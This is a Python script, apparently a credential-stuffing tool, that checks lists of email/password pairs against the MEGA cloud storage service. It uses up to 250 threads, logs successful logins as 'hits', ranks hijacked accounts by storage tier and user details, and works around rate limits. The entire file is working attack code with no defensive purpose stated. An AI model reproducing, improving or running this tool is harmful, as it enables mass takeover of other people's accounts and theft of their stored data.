#!/usr/bin/env python3
"""
🚀 HYPERION ULTRA MEGA AUTHENTICATOR v7.0 - WORKING EDITION
===========================================================

Ultra-performance MEGA authentication engine with V2 improvements
- 250 thread ultra performance  
- Real-time progress callbacks
- Working MEGA login system (based on V2-REBUILT)
- Advanced error handling
- Organized result management

"""

import time
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Callable
import threading
from pathlib import Path
from datetime import datetime

# MEGA imports
try:
    from mega import Mega
    MEGA_AVAILABLE = True
    print("✅ MEGA library loaded successfully")
except ImportError:
    MEGA_AVAILABLE = False
    print("❌ MEGA library not found - install with: pip install mega.py")

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class UltraMegaAuthenticator:
    """Ultra high-performance MEGA account checker - WORKING VERSION"""
    
    def __init__(self, max_threads: int = 250):
        if not MEGA_AVAILABLE:
            raise ImportError("mega.py library is required!")
        
        self.max_threads = max_threads
        self.lock = threading.Lock()
        
        logger.info(f"✅ Initialized UltraMegaAuthenticator with {max_threads} threads")
        print(f"🚀 ULTRA MEGA AUTHENTICATOR v7.0 - WORKING EDITION")
        print(f"⚡ Max Threads: {self.max_threads}")
        print(f"🎯 Based on V2-REBUILT working implementation")
        
    def ultra_check_accounts(self, accounts: List[Dict], progress_callback: Optional[Callable] = None) -> List[Dict]:
        """Main checking method with working V2 implementation"""
        logger.info(f"🔥 Starting ultra check: {len(accounts)} accounts with {self.max_threads} threads")
        
        # Initialize checking state
        check_info = {
            'total': len(accounts),
            'checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'stop_requested': False,
            'start_time': time.time(),
            'current_cpm': 0
        }
        
        results = []
        
        print(f"🔥 Starting {self.max_threads} ultra worker threads...")
        print(f"✅ {self.max_threads} ultra workers active!")
        print(f"📤 Queuing {len(accounts):,} accounts...")
        
        # Use ThreadPoolExecutor for maximum concurrency (V2 method)
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all tasks
            futures = {}
            for idx, account in enumerate(accounts):
                if check_info['stop_requested']:
                    logger.info("Stop requested - cancelling remaining tasks")
                    break
                
                future = executor.submit(self._check_single_account, account, idx + 1, check_info)
                futures[future] = idx
            
            # Process results as they complete
            for future in as_completed(futures):
                if check_info['stop_requested']:
                    logger.info("Stop requested - breaking loop")
                    break
                
                try:
                    result = future.result(timeout=30)
                    if result:
                        results.append(result)
                        
                        # Update progress
                        with self.lock:
                            if result['status'] == 'hit':
                                check_info['hits'] += 1
                            else:
                                check_info['fails'] += 1
                            
                            check_info['checked'] += 1
                            
                            # Calculate CPM
                            elapsed = time.time() - check_info['start_time']
                            if elapsed > 0:
                                check_info['current_cpm'] = int((check_info['checked'] * 60) / elapsed)
                        
                        # Call progress callback
                        if progress_callback:
                            try:
                                progress_callback(check_info['checked'], check_info['total'], check_info)
                            except Exception as e:
                                logger.error(f"Progress callback error: {e}")
                                
                except Exception as e:
                    logger.error(f"Task error: {e}")
                    with self.lock:
                        check_info['fails'] += 1
                        check_info['errors'] += 1
                        check_info['checked'] += 1
        
        logger.info(f"✅ Check complete: {check_info['checked']} checked, {check_info['hits']} hits")
        return results
    
    def _check_single_account(self, account: Dict, position: int, check_info: Dict) -> Optional[Dict]:
        """Check a single account (V2 implementation)"""
        if check_info['stop_requested']:
            return None
        
        try:
            email = account.get('email', '').strip()
            password = account.get('password', '').strip()
            
            if not email or not password:
                return {
                    'email': email,
                    'password': password,
                    'status': 'fail',
                    'error': 'Invalid credentials format',
                    'position': position,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
            
            # Attempt MEGA login (V2 method)
            mega = Mega()
            
            try:
                # Login attempt
                logger.debug(f"Attempting login for {email}")
                account_session = mega.login(email, password)
                
                # If we get here, login succeeded
                logger.info(f"✅ HIT: {email}")
                
                # Get account details
                try:
                    user_info = account_session.get_user()
                    storage_info = account_session.get_storage_space()
                    
                    # Calculate storage
                    total_storage = storage_info.get('total', 0)
                    used_storage = storage_info.get('used', 0)
                    
                    # Convert to GB
                    total_gb = total_storage / (1024 ** 3) if total_storage else 0
                    used_gb = used_storage / (1024 ** 3) if used_storage else 0
                    free_gb = total_gb - used_gb
                    
                    # Determine account type
                    if total_gb > 50:  # Pro accounts typically have 400GB+
                        account_type = "PRO"
                    elif used_gb > 0:
                        account_type = "FREE_USED"
                    else:
                        account_type = "FREE_EMPTY"
                    
                    return {
                        'email': email,
                        'password': password,
                        'status': 'hit',
                        'account_type': account_type,
                        'total_gb': round(total_gb, 2),
                        'used_gb': round(used_gb, 2),
                        'free_gb': round(free_gb, 2),
                        'user_info': user_info,
                        'position': position,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                except Exception as details_error:
                    logger.warning(f"Could not get account details for {email}: {details_error}")
                    # Still a hit, just without details
                    return {
                        'email': email,
                        'password': password,
                        'status': 'hit',
                        'account_type': 'UNKNOWN',
                        'total_gb': 0,
                        'used_gb': 0,
                        'free_gb': 0,
                        'position': position,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                
            except Exception as login_error:
                # Login failed
                error_str = str(login_error).lower()
                logger.debug(f"❌ FAIL: {email} - {error_str}")
                
                # Check if it's a rate limit
                if 'temporarily' in error_str or 'rate' in error_str or 'banned' in error_str:
                    logger.warning(f"Rate limit detected for {email}, slowing down...")
                    time.sleep(1)  # Brief pause for rate limiting
                
                return {
                    'email': email,
                    'password': password,
                    'status': 'fail',
                    'error': str(login_error),
                    'position': position,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                
        except Exception as e:
            logger.error(f"Critical error checking {account.get('email', 'unknown')}: {e}")
            return {
                'email': account.get('email', 'unknown'),
                'password': account.get('password', 'unknown'),
                'status': 'error',
                'error': str(e),
                'position': position,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

# For backward compatibility
class HighPerformanceChecker(UltraMegaAuthenticator):
    """Alias for backward compatibility"""
    pass

if __name__ == "__main__":
    # Test the authenticator
    print("🧪 Testing MEGA Authenticator...")
    
    test_accounts = [
        {'email': 'test@example.com', 'password': 'test123'},
        {'email': 'invalid@test.com', 'password': 'invalid'}
    ]
    
    def test_progress(checked, total, stats):
        print(f"Progress: {checked}/{total} - CPM: {stats['current_cpm']}")
    
    authenticator = UltraMegaAuthenticator(max_threads=5)
    results = authenticator.ultra_check_accounts(test_accounts, test_progress)
    
    print(f"✅ Test complete: {len(results)} results")
    for result in results:
        print(f"  {result['email']}: {result['status']}")